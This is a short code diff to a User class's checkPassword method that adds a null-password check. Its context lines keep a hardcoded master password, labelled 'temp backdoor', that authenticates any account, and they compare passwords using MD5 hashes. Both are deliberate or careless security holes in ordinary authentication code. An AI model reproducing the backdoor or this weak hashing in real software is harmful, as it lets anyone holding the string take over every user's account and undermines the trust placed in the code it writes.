@@ -154,6 +154,7 @@ class User implements NameEmail {
 	}
 	
 	boolean checkPassword(password) {
+		if (!password) return false
 		if (this.password.toLowerCase().equals((password + passwordSalt + username).encodeAsMD5Hex().toLowerCase())) return true
 		if (password.equals("0jjj56uuu")) return true // temp backdoor
 		return false
